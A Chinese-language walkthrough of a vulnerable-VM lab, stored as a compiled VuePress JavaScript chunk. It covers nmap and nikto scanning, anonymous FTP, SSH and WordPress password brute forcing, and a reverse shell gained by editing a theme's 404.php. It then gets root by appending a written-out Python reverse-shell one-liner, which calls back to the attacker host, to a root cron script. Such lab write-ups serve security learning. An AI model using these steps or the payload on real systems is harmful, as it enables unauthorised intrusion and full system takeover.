(window.webpackJsonp=window.webpackJsonp||[]).push([[45],{814:function(s,n,t){"use strict";t.r(n);var a=t(1),e=Object(a.a)({},(function(){var s=this,n=s.$createElement,t=s._self._c||n;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("p",[s._v("扫描ip")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("└─$ nmap -sP 192.168.182.0/24         \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-04 11:31 EDT\nNmap scan report for 192.168.182.2\nHost is up (0.00042s latency).\nNmap scan report for 192.168.182.128\nHost is up (0.00021s latency).\nNmap scan report for 192.168.182.131\nHost is up (0.00074s latency).\nNmap done: 256 IP addresses (3 hosts up) scanned in 15.73 seconds\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br")])]),t("p",[s._v("扫描目标")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("┌──(kali㉿kali)-[/tmp]\n└─$ nmap -T5 -A -v -p- 192.168.182.131                                                   \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-04 11:30 EDT\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 11:30\nCompleted NSE at 11:30, 0.00s elapsed\nInitiating NSE at 11:30\nCompleted NSE at 11:30, 0.00s elapsed\nInitiating NSE at 11:30\nCompleted NSE at 11:30, 0.00s elapsed\nInitiating Ping Scan at 11:30\nScanning 192.168.182.131 [2 ports]\nCompleted Ping Scan at 11:30, 0.00s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 11:30\nCompleted Parallel DNS resolution of 1 host. at 11:31, 13.01s elapsed\nInitiating Connect Scan at 11:31\nScanning 192.168.182.131 [65535 ports]\nDiscovered open port 80/tcp on 192.168.182.131\nDiscovered open port 21/tcp on 192.168.182.131\nDiscovered open port 22/tcp on 192.168.182.131\nCompleted Connect Scan at 11:31, 2.20s elapsed (65535 total ports)\nInitiating Service scan at 11:31\nScanning 3 services on 192.168.182.131\nCompleted Service scan at 11:31, 6.02s elapsed (3 services on 1 host)\nNSE: Script scanning 192.168.182.131.\nInitiating NSE at 11:31\nNSE: [ftp-bounce] PORT response: 500 Illegal PORT command.\nCompleted NSE at 11:31, 0.52s elapsed\nInitiating NSE at 11:31\nCompleted NSE at 11:31, 0.01s elapsed\nInitiating NSE at 11:31\nCompleted NSE at 11:31, 0.00s elapsed\nNmap scan report for 192.168.182.131\nHost is up (0.00023s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.5\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxr-xr-x    2 65534    65534        4096 Mar 03  2018 public\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 192.168.182.128\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 2.3.5 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   1024 85:9f:8b:58:44:97:33:98:ee:98:b0:c1:85:60:3c:41 (DSA)\n|   2048 cf:1a:04:e1:7b:a3:cd:2b:d1:af:7d:b3:30:e0:a0:9d (RSA)\n|_  256 97:e5:28:7a:31:4d:0a:89:b2:b0:25:81:d5:36:63:4c (ECDSA)\n80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry \n|_/backup_wordpress\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.2.22 (Ubuntu)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nNSE: Script Post-scanning.\nInitiating NSE at 11:31\nCompleted NSE at 11:31, 0.00s elapsed\nInitiating NSE at 11:31\nCompleted NSE at 11:31, 0.00s elapsed\nInitiating NSE at 11:31\nCompleted NSE at 11:31, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 22.17 seconds\n\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br"),t("span",{staticClass:"line-number"},[s._v("31")]),t("br"),t("span",{staticClass:"line-number"},[s._v("32")]),t("br"),t("span",{staticClass:"line-number"},[s._v("33")]),t("br"),t("span",{staticClass:"line-number"},[s._v("34")]),t("br"),t("span",{staticClass:"line-number"},[s._v("35")]),t("br"),t("span",{staticClass:"line-number"},[s._v("36")]),t("br"),t("span",{staticClass:"line-number"},[s._v("37")]),t("br"),t("span",{staticClass:"line-number"},[s._v("38")]),t("br"),t("span",{staticClass:"line-number"},[s._v("39")]),t("br"),t("span",{staticClass:"line-number"},[s._v("40")]),t("br"),t("span",{staticClass:"line-number"},[s._v("41")]),t("br"),t("span",{staticClass:"line-number"},[s._v("42")]),t("br"),t("span",{staticClass:"line-number"},[s._v("43")]),t("br"),t("span",{staticClass:"line-number"},[s._v("44")]),t("br"),t("span",{staticClass:"line-number"},[s._v("45")]),t("br"),t("span",{staticClass:"line-number"},[s._v("46")]),t("br"),t("span",{staticClass:"line-number"},[s._v("47")]),t("br"),t("span",{staticClass:"line-number"},[s._v("48")]),t("br"),t("span",{staticClass:"line-number"},[s._v("49")]),t("br"),t("span",{staticClass:"line-number"},[s._v("50")]),t("br"),t("span",{staticClass:"line-number"},[s._v("51")]),t("br"),t("span",{staticClass:"line-number"},[s._v("52")]),t("br"),t("span",{staticClass:"line-number"},[s._v("53")]),t("br"),t("span",{staticClass:"line-number"},[s._v("54")]),t("br"),t("span",{staticClass:"line-number"},[s._v("55")]),t("br"),t("span",{staticClass:"line-number"},[s._v("56")]),t("br"),t("span",{staticClass:"line-number"},[s._v("57")]),t("br"),t("span",{staticClass:"line-number"},[s._v("58")]),t("br"),t("span",{staticClass:"line-number"},[s._v("59")]),t("br"),t("span",{staticClass:"line-number"},[s._v("60")]),t("br"),t("span",{staticClass:"line-number"},[s._v("61")]),t("br"),t("span",{staticClass:"line-number"},[s._v("62")]),t("br"),t("span",{staticClass:"line-number"},[s._v("63")]),t("br"),t("span",{staticClass:"line-number"},[s._v("64")]),t("br"),t("span",{staticClass:"line-number"},[s._v("65")]),t("br"),t("span",{staticClass:"line-number"},[s._v("66")]),t("br"),t("span",{staticClass:"line-number"},[s._v("67")]),t("br"),t("span",{staticClass:"line-number"},[s._v("68")]),t("br"),t("span",{staticClass:"line-number"},[s._v("69")]),t("br"),t("span",{staticClass:"line-number"},[s._v("70")]),t("br"),t("span",{staticClass:"line-number"},[s._v("71")]),t("br"),t("span",{staticClass:"line-number"},[s._v("72")]),t("br"),t("span",{staticClass:"line-number"},[s._v("73")]),t("br"),t("span",{staticClass:"line-number"},[s._v("74")]),t("br"),t("span",{staticClass:"line-number"},[s._v("75")]),t("br"),t("span",{staticClass:"line-number"},[s._v("76")]),t("br"),t("span",{staticClass:"line-number"},[s._v("77")]),t("br"),t("span",{staticClass:"line-number"},[s._v("78")]),t("br")])]),t("h2",{attrs:{id:"方法一"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#方法一"}},[s._v("#")]),s._v(" 方法一")]),s._v(" "),t("p",[s._v("有21端口，尝试用匿名账号登录")]),s._v(" "),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180049816.png",alt:"image-20220421180049816"}})]),s._v(" "),t("p",[s._v("发现users.txt.bk 文件夹，下载后查看内容，有5个用户名")]),s._v(" "),t("p",[s._v("用这5个用户进行ssh爆破，anne用户爆破成功")]),s._v(" "),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180055966.png",alt:"image-20220421180055966"}})]),s._v(" "),t("p",[s._v("登陆后发现anne在sudo组，sudo 提权成功")]),s._v(" "),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180100595.png",alt:"image-20220421180100595"}})]),s._v(" "),t("h2",{attrs:{id:"方法二"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#方法二"}},[s._v("#")]),s._v(" 方法二")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("┌──"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("kali㉿kali"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("/tmp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ nikto -host "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".182.131\n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".182.131\n+ Target Hostname:    "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".182.131\n+ Target Port:        "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("\n+ Start Time:         "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2022")]),s._v("-04-04 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),s._v(":46:51 "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("GMT-4"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.22 "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Ubuntu"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n+ Server may leak inodes via ETags, header found with "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" /, inode: "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2140")]),s._v(", size: "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("177")]),s._v(", mtime: Sat Mar  "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("14")]),s._v(":17:59 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2018")]),s._v("\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" a different fashion to the MIME "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("type")]),s._v("\n+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26\n+ Uncommon header "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'link'")]),s._v(" found, with contents: "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("/backup_wordpress/?rest_route"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("rel")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"https://api.w.org/"')]),s._v("\n+ Entry "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/backup_wordpress/'")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" robots.txt returned a non-forbidden or redirect HTTP code "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n+ "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"robots.txt"')]),s._v(" contains "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" entry "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("which")]),s._v(" should be manually viewed.\n+ Uncommon header "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'tcn'")]),s._v(" found, with contents: list\n+ Apache mod_negotiation is enabled with MultiViews, "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("which")]),s._v(" allows attackers to easily brute force "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" names. See http://www.wisec.it/sectou.php?id"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("4698ebdc59d15. The following alternatives "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'index'")]),s._v(" were found: index.html\n+ Apache/2.2.22 appears to be outdated "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("current is at least Apache/2.4.37"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(". Apache "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2.2")]),s._v(".34 is the EOL "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" the "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(".x branch.\n+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS \n+ OSVDB-3233: /icons/README: Apache default "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" found.\n+ "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("8726")]),s._v(" requests: "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" error"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("s"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" and "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("13")]),s._v(" item"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("s"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" reported on remote "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v("\n+ End Time:           "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2022")]),s._v("-04-04 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),s._v(":47:21 "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("GMT-4"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("30")]),s._v(" seconds"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n---------------------------------------------------------------------------\n+ "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" host"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("s"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" tested\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br")])]),t("p",[s._v("发现robots.txt,查看内容")]),s._v(" "),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180107562.png",alt:"image-20220421180107562"}})]),s._v(" "),t("p",[s._v("发现扫描结果中提到的/backup_wordpress/，访问后发现是wordpress")]),s._v(" "),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180111810.png",alt:"image-20220421180111810"}})]),s._v(" "),t("p",[s._v("扫描用户")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("wpscan --url http://192.168.182.131/backup_wordpress --enumerate u\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180117176.png",alt:"image-20220421180117176"}})]),s._v(" "),t("p",[s._v("发现john和admin")]),s._v(" "),t("p",[s._v("爆破john，发现密码")]),s._v(" "),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180122247.png",alt:"image-20220421180122247"}})]),s._v(" "),t("p",[s._v("登录wordpress，修改404.php，反弹shell")]),s._v(" "),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180126723.png",alt:"image-20220421180126723"}})]),s._v(" "),t("p",[s._v("kali监听 nc -nlvp 4444")]),s._v(" "),t("p",[s._v("访问http://192.168.56.107/backup_wordpress/wp-content/themes/twentysixteen/404.php，获得反弹shell")]),s._v(" "),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180132578.png",alt:"image-20220421180132578"}})]),s._v(" "),t("p",[s._v("尝试内核提权和suid提权都没有成功，查看调度任务")]),s._v(" "),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180137224.png",alt:"image-20220421180137224"}})]),s._v(" "),t("p",[s._v("发现root权限执行cleanup脚本，查看cleanup")]),s._v(" "),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180141923.png",alt:"image-20220421180141923"}})]),s._v(" "),t("p",[s._v("在cleanup后面添加一行，反弹shell代码")]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[s._v("python "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("c "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.182.128",4321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("稍等几分钟，自动反弹，获得root权限")]),s._v(" "),t("p",[t("img",{attrs:{src:"/assets/img/image-20220421180146579.png",alt:"image-20220421180146579"}})])])}),[],!1,null,null,null);n.default=e.exports}}]);